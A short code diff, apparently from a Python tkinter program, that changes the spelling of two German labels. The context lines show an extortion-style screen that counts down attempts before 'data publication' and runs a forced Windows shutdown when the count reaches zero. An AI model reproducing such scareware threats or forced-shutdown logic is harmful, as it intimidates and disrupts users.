@@ -57,7 +57,7 @@ entry_1.focus()
 def clicked(): 
     global count
     count = count - 1
-    label1.configure(text=f'Verbleibende Versuche bevor Datenveroeffentlichung: {count}')
+    label1.configure(text=f'Verbleibende Versuche bevor Datenveröffentlichung: {count}')
 
     if (count == 0):
         os.system("shutdown /s /t 1")
@@ -96,7 +96,7 @@ schaltf1.grid()
 
 
 bar = ttk.Progressbar(mainWin, orient="horizontal", mode='determinate', maximum=100, value=0)
-label_bar = tk.Label(mainWin, text="Vorbereitung zur Datenveroeffentlichung", bg='black', fg='red')
+label_bar = tk.Label(mainWin, text="Vorbereitung zur Datenveröffentlichung", bg='black', fg='red')
 label_bar.grid()
 bar.grid()
 
